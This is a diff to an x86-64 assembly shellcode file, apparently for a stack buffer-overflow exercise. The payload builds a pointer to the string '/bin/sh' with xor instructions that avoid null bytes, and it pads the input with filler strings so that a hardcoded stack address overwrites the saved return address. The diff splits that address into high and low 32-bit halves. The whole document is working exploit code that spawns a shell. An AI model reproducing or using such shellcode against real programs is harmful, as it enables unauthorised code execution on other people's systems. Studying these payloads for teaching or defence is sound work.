@@ -4,7 +4,8 @@
 
 #include <sys/syscall.h>
 
-#define buffer 0x7fffffffe910
+#define buffer_ptr_h 0x7fff
+#define buffer_ptr_l 0xffffdf40
 #define ADD(X, Y) (X + Y)
 
 .globl main
@@ -13,11 +14,11 @@
 main:
 
         xor     %rcx, %rcx
-        xor     $0x7fff, %cx
+        xor     $buffer_ptr_h, %cx
         shl     $32, %rcx
 
         xor     %rax, %rax
-        xor     $ADD(buffer, 61), %eax   /* lower part of ptr to str "/bin/sh" */
+        xor     $ADD(buffer_ptr_l, 61), %eax   /* lower part of ptr to str "/bin/sh" */
         xor     %rax, %rcx               /* ptr to str "/bin/sh" */
 
         xor     %rax, %rax
@@ -42,4 +43,5 @@ main:
         .ascii  "cccc"                   /* pad to overwrite return address */
         .ascii  "dddd"                   /* pad to overwrite return address */
         .ascii  "eeee"                   /* pad to overwrite return address */
-        .quad   buffer                   /* buffer ptr (the first instruction of payload), will overwrite real return address */
+        .long   buffer_ptr_l             /* low part of buffer ptr (the first instruction of payload), will overwrite real return address */
+        .long   buffer_ptr_h             /* high part of buffer ptr (the first instruction of payload), will overwrite real return address */
